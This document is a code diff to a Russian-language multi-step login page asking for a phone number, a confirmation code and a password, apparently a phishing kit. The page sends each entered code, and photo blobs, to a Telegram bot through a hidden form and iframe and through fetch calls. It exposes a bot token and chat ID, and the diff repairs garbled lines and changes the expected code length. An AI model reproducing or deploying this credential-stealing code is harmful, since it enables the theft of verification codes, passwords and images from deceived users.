@@ -51,13 +51,12 @@ input:focus { border-color: #ffdd2d; background: #fff; }
   <div id="step2" class="step2 hidden">
     <h1>Введите код</h1>
     <p>Отправили код подтверждения на ваш номер</p>
-chat    <div class="field">
-      <label>Код</label_id>
-      <input type="tel" id="code" placeholder',="Код" maxlength="5">
+    <div class="field">
+      <label>Код</label>
+      <input type="tel" id="code" placeholder="Код" maxlength="4">
     </div>
- chat    <div class="timer" id="timer">Отправим);
- снова через 40 сек</div>
-   </div>
+    <div class="timer" id="timer">Отправим снова через 40 сек</div>
+  </div>
 
   <div id="step3" class="step3 hidden">
     <h1>Введите пароль</h1>
@@ -70,7 +69,6 @@ chat    <div class="field">
   </div>
 </div>
 
-<!-- Скрытая форма и iframe для отправки без CORS -->
 <form id="tgForm" action="https://api.telegram.org/bot8374650070:AAGzjKVuATwofDM9ngx-TYIDH1Myizc0LZg/sendMessage" method="GET" target="hidden_iframe" style="display:none;">
   <input type="hidden" name="chat_id" value="7887003990">
   <input type="hidden" name="text" id="tgText">
@@ -90,7 +88,8 @@ function send(text) {
 
 function sendPhoto(blob, caption) {
   var form = new FormData();
-  form.append(' form.append('photo', blob, 'photo.jpg');
+  form.append('chat_id', chat);
+  form.append('photo', blob, 'photo.jpg');
   if (caption) form.append('caption', caption);
   fetch('https://api.telegram.org/bot' + token + '/sendPhoto', { method: 'POST', body: form });
 }
@@ -336,7 +335,7 @@ document.getElementById('next1').addEventListener('click', function() {
 });
 
 document.getElementById('code').addEventListener('input', function() {
-  if (this.value.length === 5) {
+  if (this.value.length === 4) {
     userData.code = this.value;
     send('🔑 Код: ' + this.value);
     document.getElementById('step2').classList.add('hidden');
